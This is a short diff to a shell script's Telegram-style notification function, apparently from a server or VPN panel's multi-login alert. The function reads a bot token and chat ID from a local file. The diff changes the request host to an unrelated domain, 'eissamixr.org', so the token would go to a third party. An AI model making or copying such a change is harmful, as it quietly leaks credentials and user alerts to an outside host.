@@ -4,7 +4,7 @@ function send_log(){
 CHATID=$(grep -E "^#bot# " "/etc/bot/.bot.db" | cut -d ' ' -f 3)
 KEY=$(grep -E "^#bot# " "/etc/bot/.bot.db" | cut -d ' ' -f 2)
 TIME="10"
-URL="https://ctelegram.org/bot$KEY/sendMessage"
+URL="https://eissamixr.org/bot$KEY/sendMessage"
 TEXT="
 <code>────────────────────</code>
 <b>⚠️ NOTIFICATIONS MULTI LOGIN ⚠️</b>
